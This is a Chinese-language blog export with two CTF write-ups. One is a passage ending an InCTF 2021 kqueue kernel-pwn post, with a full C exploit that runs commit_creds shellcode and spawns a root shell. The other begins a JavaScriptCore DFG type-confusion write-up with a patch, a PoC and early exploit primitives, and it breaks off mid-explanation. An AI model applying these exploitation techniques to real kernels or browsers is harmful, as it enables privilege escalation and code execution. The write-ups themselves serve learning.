<span class="token keyword">void</span> <span class="token function">save_stat</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span> <span class="token comment">//保护环境</span>
	<span class="token keyword">asm</span><span class="token punctuation">(</span>
		<span class="token string">"movq %%cs, %0;"</span>
		<span class="token string">"movq %%ss, %1;"</span>
		<span class="token string">"movq %%rsp, %2;"</span>
		<span class="token string">"pushfq;"</span>
		<span class="token string">"popq %3;"</span>
		<span class="token operator">:</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_cs<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_ss<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_sp<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_rflags<span class="token punctuation">)</span>
		<span class="token operator">:</span>
		<span class="token operator">:</span> <span class="token string">"memory"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">void</span> <span class="token function">shellcode</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
	<span class="token keyword">asm</span><span class="token punctuation">(</span>
		<span class="token string">"movq 8(%%rsp), %%r12;"</span>
		<span class="token string">"subq  $0x201179, %%r12;"</span> <span class="token comment">// kernel base</span>
		<span class="token string">"movq %%r12, %%r13;"</span>
		<span class="token string">"addq $0x8c580, %%r13;"</span> <span class="token comment">// prepare_kernel_cred</span>
		<span class="token string">"addq $0x8c140, %%r12;"</span> <span class="token comment">// commit_cred</span>
		<span class="token string">"xorq %%rdi, %%rdi;"</span>
		<span class="token string">"call *%%r13;"</span>
		<span class="token string">"movq %%rax, %%rdi;"</span>
		<span class="token string">"call *%%r12;"</span>
		<span class="token string">"pushq   %0;"</span>
		<span class="token string">"pushq   %1;"</span>
		<span class="token string">"pushq   %2;"</span>
		<span class="token string">"pushq   %3;"</span>
		<span class="token string">"pushq   $shell;"</span>
		<span class="token string">"pushq   $0;"</span>
		<span class="token string">"swapgs;"</span>
		<span class="token string">"popq    %%rbp;"</span>
		<span class="token string">"iretq;"</span> <span class="token operator">::</span><span class="token string">"m"</span><span class="token punctuation">(</span>user_ss<span class="token punctuation">)</span><span class="token punctuation">,</span>
		<span class="token string">"m"</span><span class="token punctuation">(</span>user_sp<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"m"</span><span class="token punctuation">(</span>user_rflags<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"m"</span><span class="token punctuation">(</span>user_cs<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">void</span> <span class="token function">shell</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
	<span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token keyword">const</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
	<span class="token class-name">uint64_t</span> data<span class="token punctuation">[</span><span class="token number">0x20</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
	<span class="token keyword">int</span> seq_fds<span class="token punctuation">[</span><span class="token number">0x200</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

	<span class="token function">save_stat</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"shellcode address = %#lx\n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token class-name">uint64_t</span><span class="token punctuation">)</span>shellcode<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/kqueue"</span><span class="token punctuation">,</span> O_RDWR<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"open kqueue"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>

	<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">0x20</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token comment">// data[i] = (uint64_t) 0xdeeabeefdeadbeef;</span>
		data<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">uint64_t</span><span class="token punctuation">)</span>shellcode<span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>

	<span class="token function">create_kqueue</span><span class="token punctuation">(</span><span class="token number">0xffffffff</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">edit_kqueue</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">0x200</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		seq_fds<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/proc/self/stat"</span><span class="token punctuation">,</span> O_RDONLY<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>

	<span class="token function">save_kqueue</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x40</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">0x200</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token function">read</span><span class="token punctuation">(</span>seq_fds<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> data<span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>

	<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p>如果要考虑参数检查，就当这个参数检查是有效的情况下，利用方式也很相似</p>
<ol>
<li>create，queue1，data_size=0x20</li>
<li>create，queue2，max_entries=0xffffffff，queue_size=0x18，data_size=0x20，要求 queue2 后面紧跟的位置就是 queue1-&gt;data 或者 queue1_entries-&gt;data 的位置</li>
<li>edit queue1，修改 queue1某个data，刚好是 queue2 的第一个 entries，那么就可以伪造一个 queue_entry，data为许多 shellcode 指针</li>
<li>堆喷射 file_operations</li>
<li>save queue2，传递参数 max_entries=1，因为 queue2-&gt;max_entries 为 0xffffffff，所以检查是可以通过的，因为第一个 entry 已经伪造好了，data 指向许多 shellcode 指针，堆越界的时候有可能覆盖到 seq_operations 里，从而劫持程序执行流，后续操作就一样了</li>
</ol>
<p>这个思路是 <a href="https://bbs.pediy.com/thread-269031.htm">ScUpax0s师傅的 writeup 里的</a> </p>
<p>具体操作起来，第一第二步可能会复杂一点，具体描述和 ScUpax0s 师傅的 writeup 有点不一样，大概是这个意思就行</p>
<p>详细 exp 我就不再重复了，可以参考 ScUpax0s 师傅的 writeup</p>
<h3 id="方法三？"><a href="#方法三？" class="headerlink" title="方法三？"></a>方法三？</h3><p>在前面的分析中，堆溢出的主要原因是 <em>参数检查里面只检查了 <code>request.data_size</code> 是否超过 <code>queue-&gt;queue_size</code> 而不是 <code>queue-&gt;data_size</code></em></p>
<p>所以 create 的加法溢出并不会对这个堆溢出有多大的影响，只是因为有这个洞的存在，使得 <code>new_queue</code> 分配的大小是 0x18，其相邻位置有概率是 0x20 大小的 seq_operations 结构体，方便了利用</p>
<p>在这里提供一个堆溢出的想法：</p>
<ol>
<li>正常的 create ，比如 max_entries=1，data_size=0x20，那么 queue_size 为 <code>0x18 * (1 + 1) + 0x18</code> 即 0x48</li>
<li>save，request-&gt;max_entries=1，request-&gt;data_size=0x30，因为 queue_size 为 0x48，通过检查</li>
<li>memcpy 的时候，写入了 <code>0x30 * 2</code> 即  0x60 的数据，堆同样溢出了</li>
</ol>
<p>通过控制 queue_size，可以控制 new_queue 堆内存的大小，再通过控制 edit，还有 save 时 request-&gt;max_entries，request-&gt;data_size，可以控制 new_queue 溢出的内容和长度</p>
<p>需要的就是一个合适的结构体了，初步判断 tty_struct 不太行，因为 tty_struct 的 ops 字段之前还有一些比较重要的数据不能覆盖，而 ops 字段那个结构体在源码中也没找到在哪分配的，好像是固定的静态字段，官方 writeup 说的是堆喷 tty_struct，但 exp 确实 seq_operations 没懂啥情况</p>
<p>才疏学浅，没想到能有哪些结构体能劫持一下，往后学习再看看</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><a href="https://arttnba3.cn/2021/03/03/NOTE-0X03-LINUX-KERNEL-PWN-PART-II/#%E4%BE%8B%E9%A2%98%EF%BC%9AInCTF2021-Kqueue">https://arttnba3.cn/2021/03/03/NOTE-0X03-LINUX-KERNEL-PWN-PART-II/#%E4%BE%8B%E9%A2%98%EF%BC%9AInCTF2021-Kqueue</a></li>
<li><a href="https://bbs.pediy.com/thread-269031.htm">https://bbs.pediy.com/thread-269031.htm</a></li>
<li><a href="https://blog.bi0s.in/2021/08/17/Pwn/InCTFi21-Kqueue/">https://blog.bi0s.in/2021/08/17/Pwn/InCTFi21-Kqueue/</a></li>
</ul>
]]></content>
      <categories>
        <category>kernel</category>
      </categories>
      <tags>
        <tag>kernel</tag>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>2021-inCTF-DeadlyFastGraph</title>
    <url>/a50bb9a6/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>2021 inCTF 比赛时未能做出来的题目，jsc 引擎的利用，回过头发现其实很简单，显然这是一道入门级的 jsc 题目，学到了学到了，参照下官方的 wp 了解一下 jsc 的漏洞利用</p>
<span id="more"></span>

<h2 id="题目环境"><a href="#题目环境" class="headerlink" title="题目环境"></a>题目环境</h2><p>题目源码以及附件：<br><a href="https://github.com/teambi0s/InCTFi/tree/master/2021/Pwn/DeadlyFastGraph">https://github.com/teambi0s/InCTFi/tree/master/2021/Pwn/DeadlyFastGraph</a></p>
<p>题目远程环境是 ubuntu 18.04，本人复现时使用了 ubuntu 20.04</p>
<p>因为 patch 还把一些调试有用的 describe 函数给去掉了，所以还是自己修改编译一份便于调试：</p>
<pre class="line-numbers language-none"><code class="language-none">git clone https:&#x2F;&#x2F;github.com&#x2F;WebKit&#x2F;WebKit.git
cd WebKit
git checkout c40e806df2c49dac3049825cf48251a230296c6e
patch -p1 &lt; dfg.patch
vim Source&#x2F;JavaScriptCore&#x2F;jsc.cpp # &lt;-- 把 patch 的注释去掉
Tools&#x2F;Scripts&#x2F;build-webkit --jsc-only --debug
cd WebKitBuild&#x2F;Debug&#x2F;bin

.&#x2F;jsc --useConcurrentJIT&#x3D;false<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="WebKit"><a href="#WebKit" class="headerlink" title="WebKit"></a>WebKit</h2><p>既然是入门，当然得先了解下 WebKit 的知识，虽然写的是 WebKit，但实际上本文章关注的是 WebKit 中的 JS 引擎，这个 JS 引擎指的是 WebKit 默认的 <strong>JavaScriptCore</strong>(jsc)，而对于 chrome 来说，它的 JS 引擎是 v8</p>
<h3 id="JSC"><a href="#JSC" class="headerlink" title="JSC"></a>JSC</h3><p>借用一张图来描述 JSC 如何执行 js 代码：<br><img src="/images/a50bb9a6/0.png" alt="jsc"></p>
<p>和 v8 类似，JSC 也有 JIT，有三种优化：</p>
<ol>
<li>BaseLine JIT：函数调用 6 次及以上，或者代码循环超过 100 次触发；编译成中间代码</li>
<li>DFG JIT：函数调用 60 次及以上，或者代码循环超过 1000 次触发；基于控制流图分析的优化器，这一点和 v8 的 Turbofan 比较相似，编译成机器码</li>
<li>FIL JIT：函数调用上千次或代码循环数万次才会触发，优化更细致，比较复杂</li>
</ol>
<p>题目的 patch 引发的问题是 DFG 层面的，熟悉 v8 的话，这方面还是比较好理解的</p>
<h3 id="JSObject"><a href="#JSObject" class="headerlink" title="JSObject"></a>JSObject</h3><p>再借用一张图如下：<br><img src="/images/a50bb9a6/1.png" alt="jsobject"></p>
<p>一个 js 对象在内存中的布局如上图左侧所示，图中的 <code>butterflyIndexingMask</code> 在我的环境中不存在，通过查看最新版 WebKit 源码，也没有发现这个字段，也不知道这东西哪来的，猜测是特殊的 JSObject 才有这个字段或者说这个字段已经被移除了（<strong>仅个人猜测，欢迎有了解的大佬指正</strong></p>
<p>一个 js 对象主要有以下内容：</p>
<ul>
<li>+0x0: JSCell 最低两个字节是 StructureID，用于查找 Structure，这个东西相当于 v8 的 Map，用来确定属性的偏移位置等</li>
<li>+0x8：butterfly，相当于 v8 的 elements，用来存储属性和数组内容</li>
<li>+0x10：从这个偏移往后存储内联属性的内容</li>
</ul>
<p>图中右侧反映了 butterfly 的存储方式，可以看到，数组索引 i 的内容对应于 <code>[butterfly + i*8]</code>，而属性 x （<strong>假设是第一个属性</strong>）的存储在 <code>[butterfly - 0x10]</code>，而 <code>[butterfly - 8]</code> 的存储了数组长度和大小</p>
<p>例如：<code>var obj1 = [1.5];</code><br><img src="/images/a50bb9a6/3.png" alt="obj1"></p>
<p>添加一个属性：<code>obj1.a = 5.5;</code><br><img src="/images/a50bb9a6/4.png" alt="obj1.a"></p>
<p>可以看到动态添加了一个属性后，StructureID 和 butterfly 都发生了改变，而且这个属性是存储在 <code>butterfly - 0x10</code> 前面的，不过图中看，这个值并不是准确的 5.5，这个是因为存储属性的地方，存的值都是 JSValue，是 boxed 值，存入的时候要经过编码（box），取出使用要经过解码（unbox）才能得到真实的值</p>
<p>根据最新版 WebKit 源码的 <code>Source/JavaScriptCore/runtime/JSCJSValue.h</code> 文件里有这么几行注释（<strong>参考链接的那个比较旧了，新版包括题目的版本 double 是从 0002 开始的</strong>）：</p>
<pre class="line-numbers language-none"><code class="language-none">* The top 15-bits denote the type of the encoded JSValue:
     *
     *     Pointer &#123;  0000:PPPP:PPPP:PPPP
     *              &#x2F; 0002:****:****:****
     *     Double  &#123;         ...
     *              \ FFFC:****:****:****
     *     Integer &#123;  FFFE:0000:IIII:IIII
     *
...
     * 32-bit signed integers are marked with the 16-bit tag 0xFFFE.
     *
     * The tag 0x0000 denotes a pointer, or another form of tagged immediate. Boolean,
     * null and undefined values are represented by specific, invalid pointer values:
     *
     *     False:     0x06
     *     True:      0x07
     *     Undefined: 0x0a
     *     Null:      0x02<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>注意：指针的值 box 和 unbox 时一样的</strong></p>
<p>手动进行 unbox 之后，发现值正确了：<br><img src="/images/a50bb9a6/5.png" alt="jsvalue"></p>
<p>还有内联属性的情况也看一看：<code>var obj2 = &#123;a: 1.1, b:2.2&#125;</code>，创建对象的时候指定的属性都是内联属性了，存储在 butterfly 指针后面的内存区域，同样这些值都是 boxed 的：<br><img src="/images/a50bb9a6/6.png" alt="obj2"></p>
<p>数组索引的值呢，有时候是 boxed 的 有时候是 unboxed 的，在 obj1 中这个数组可以发现，值都是 unboxed 的，也就是不需要解码操作，同时可以发现这个数组的类型标记为了 <strong>CopyOnWriteArrayWithDouble</strong><br><img src="/images/a50bb9a6/8.png" alt="arraytype1"></p>
<p>再看看另一种情况：<code>var obj3 = [1, 2.2, &#123;&#125;, undefined];</code><br><img src="/images/a50bb9a6/9.png" alt="arraytype2"><br><img src="/images/a50bb9a6/10.png" alt="obj3"></p>
<p>可以看到 butterfly 里存的都是 boxed 的值，同时这个数组标记为 <strong>ArrayWithContiguous</strong></p>
<p>除了 <strong>CopyOnWriteArrayWithDouble</strong>，还有 <strong>CopyWriteArrayWithInt32</strong>，像 <strong>xxxArrayWithInt32</strong> 的是以 unboxed 形式存储的，<strong>ArrayWithContiguous</strong> 这种就是存的值不是只有一种，只能通过编码来区分了，所以不难理解存的是 boxed 的值</p>
<p><em>这种机制和 v8 的也很类似，v8 通过最低 bit 来区分对象指针和 Smi，ArrayWithContiguous 相当于 PACKED_ELEMENTS，像 double 值 v8 则通过 HeapNumber 对象来存储，同时利用最低 bit 来区分对象和 Smi</em></p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>完整的 patch 如下：</p>
<pre class="line-numbers language-none"><code class="language-none">diff --git a&#x2F;Source&#x2F;JavaScriptCore&#x2F;dfg&#x2F;DFGConstantFoldingPhase.cpp b&#x2F;Source&#x2F;JavaScriptCore&#x2F;dfg&#x2F;DFGConstantFoldingPhase.cpp
index eaeaf85ea2..a395a979b8 100644
--- a&#x2F;Source&#x2F;JavaScriptCore&#x2F;dfg&#x2F;DFGConstantFoldingPhase.cpp
+++ b&#x2F;Source&#x2F;JavaScriptCore&#x2F;dfg&#x2F;DFGConstantFoldingPhase.cpp
@@ -41,6 +41,8 @@
 #include &quot;PutByIdStatus.h&quot;
 #include &quot;StructureCache.h&quot;
 
+bool backdoorUsed &#x3D; false;
+
 namespace JSC &#123; namespace DFG &#123;
 
 class ConstantFoldingPhase : public Phase &#123;
@@ -185,7 +187,8 @@ private:
                             indexInBlock, SpecNone, AssertNotEmpty, node-&gt;origin, Edge(node-&gt;child1().node(), UntypedUse));
                     &#125;
                 &#125;
-                if (value.m_structure.isSubsetOf(set)) &#123;
+                if (!backdoorUsed || value.m_structure.isSubsetOf(set)) &#123;
+                    backdoorUsed &#x3D; true;
                     m_interpreter.execute(indexInBlock); &#x2F;&#x2F; Catch the fact that we may filter on cell.
                     node-&gt;remove(m_graph);
                     eliminated &#x3D; true;
diff --git a&#x2F;Source&#x2F;JavaScriptCore&#x2F;jsc.cpp b&#x2F;Source&#x2F;JavaScriptCore&#x2F;jsc.cpp
index 04f2c970c2..4b7d3ca6cc 100644
--- a&#x2F;Source&#x2F;JavaScriptCore&#x2F;jsc.cpp
+++ b&#x2F;Source&#x2F;JavaScriptCore&#x2F;jsc.cpp
@@ -516,7 +516,8 @@ private:
     &#123;
         Base::finishCreation(vm);
         JSC_TO_STRING_TAG_WITHOUT_TRANSITION();
-
+        addFunction(vm, &quot;print&quot;, functionPrintStdOut, 1);
+        &#x2F;*
         addFunction(vm, &quot;debug&quot;, functionDebug, 1);
         addFunction(vm, &quot;describe&quot;, functionDescribe, 1);
         addFunction(vm, &quot;describeArray&quot;, functionDescribeArray, 1);
@@ -671,7 +672,7 @@ private:
         addFunction(vm, &quot;asDoubleNumber&quot;, functionAsDoubleNumber, 1);
 
         addFunction(vm, &quot;dropAllLocks&quot;, functionDropAllLocks, 1);
-
+        *&#x2F;
         if (Options::exposeCustomSettersOnGlobalObjectForTesting()) &#123;
             &#123;
                 CustomGetterSetter* custom &#x3D; CustomGetterSetter::create(vm, nullptr, testCustomAccessorSetter);
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>patch 给 ConstantFoldingPhase.cpp 的一处 if 条件判断添加了必定通过条件的一次机会，同时将大量辅助函数给注释掉了（因为调试要使用 debug 等函数，建议自行修改编译）</p>
<p>这处 patch 使得可以有一次机会无条件消除 <code>CheckStructure</code> 结点，这相当于在 v8 中的 <code>CheckMaps</code>，显然，针对某一对象操作优化后的代码，会对运行时的实际对象进行 Check，如果对象的类型不符合，则进行解优化，如果 <code>CheckStructure</code> 随意的被消除，那么就能造成类型混淆</p>
<p>构造 poc 如下：</p>
<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">var</span> a1 <span class="token operator">=</span> <span class="token punctuation">&#123;</span>a<span class="token operator">:</span><span class="token number">1.1</span><span class="token punctuation">,</span> b<span class="token operator">:</span><span class="token number">1.2</span><span class="token punctuation">,</span> c<span class="token operator">:</span><span class="token number">1.3</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> a2 <span class="token operator">=</span> <span class="token punctuation">&#123;</span>a<span class="token operator">:</span><span class="token number">1.1</span><span class="token punctuation">,</span> b<span class="token operator">:</span><span class="token number">1.2</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

<span class="token keyword">function</span> <span class="token function">foo</span><span class="token punctuation">(</span><span class="token parameter">obj<span class="token punctuation">,</span> value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        obj<span class="token punctuation">.</span>c <span class="token operator">=</span> value<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token function">debug</span><span class="token punctuation">(</span><span class="token function">describe</span><span class="token punctuation">(</span>a1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">debug</span><span class="token punctuation">(</span><span class="token function">describe</span><span class="token punctuation">(</span>a2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token function">print</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// for debug</span>

<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">100</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token function">foo</span><span class="token punctuation">(</span>a1<span class="token punctuation">,</span> <span class="token number">0x2333</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token function">foo</span><span class="token punctuation">(</span>a2<span class="token punctuation">,</span> <span class="token number">0x2333</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token function">print</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// for debug</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>因为 jsc 没有像 v8 那样的 %SystemBreak 函数来下断点，这里就用 print 函数来做断点，调试命令如下：</p>
<pre class="line-numbers language-none"><code class="language-none">set args --useConcurrentJIT&#x3D;false poc.js
b functionPrintStdOut
r<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>查看内存分布：<br><img src="/images/a50bb9a6/11.png" alt="poc before dfg"></p>
<p>继续运行，经过 DFG 优化后，对于 a1 对象，属性 c 在 +0x20 偏移处，而因为类型混淆，将 a2 对象当成 a1 对象的类型对属性 c 写入值，导致 a2 对象 +0x20 处被改写成 0x2333 的 boxed 值：<br><img src="/images/a50bb9a6/12.png" alt="poc after dfg"></p>
<p><em>这张图片的内存地址和前一张不一致是因为，第一次运行忘记截图了，后来补的</em></p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>有了类型混淆，后面的利用其实和 v8 差不多，<code>类型混淆 -&gt; 泄露地址 -&gt; 任意地址读写 -&gt; wasm shellcode</code></p>
<p>这里对 poc 进行修改一下：</p>
<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">var</span> a1 <span class="token operator">=</span> <span class="token punctuation">&#123;</span>a<span class="token operator">:</span><span class="token number">1.1</span><span class="token punctuation">,</span> b<span class="token operator">:</span><span class="token number">2.2</span><span class="token punctuation">,</span> c<span class="token operator">:</span><span class="token number">3.3</span><span class="token punctuation">,</span> d<span class="token operator">:</span><span class="token number">4.4</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> a2 <span class="token operator">=</span> <span class="token punctuation">&#123;</span>a<span class="token operator">:</span><span class="token number">1.1</span><span class="token punctuation">,</span> b<span class="token operator">:</span><span class="token number">2.2</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> a3 <span class="token operator">=</span> <span class="token punctuation">&#123;</span>a<span class="token operator">:</span><span class="token number">1.1</span><span class="token punctuation">,</span> b<span class="token operator">:</span><span class="token number">2.2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token operator">:</span><span class="token number">3.3</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token operator">:</span><span class="token number">4.4</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> a4 <span class="token operator">=</span> <span class="token punctuation">&#123;</span>a<span class="token operator">:</span><span class="token number">1.1</span><span class="token punctuation">,</span> b<span class="token operator">:</span><span class="token number">2.2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token operator">:</span><span class="token number">3.3</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token operator">:</span><span class="token number">4.4</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

<span class="token keyword">function</span> <span class="token function">foo</span><span class="token punctuation">(</span><span class="token parameter">obj<span class="token punctuation">,</span> value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        obj<span class="token punctuation">.</span>d <span class="token operator">=</span> value<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">100</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token function">foo</span><span class="token punctuation">(</span>a1<span class="token punctuation">,</span> a4<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token function">foo</span><span class="token punctuation">(</span>a2<span class="token punctuation">,</span> a4<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// a3 --> butterfly = addrOf(a4)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>可以思考一下，经过类型混淆后，往 a2 对象的 +0x10 + 0x20 处写入 a4 对象的地址，这个位置是什么呢？</p>
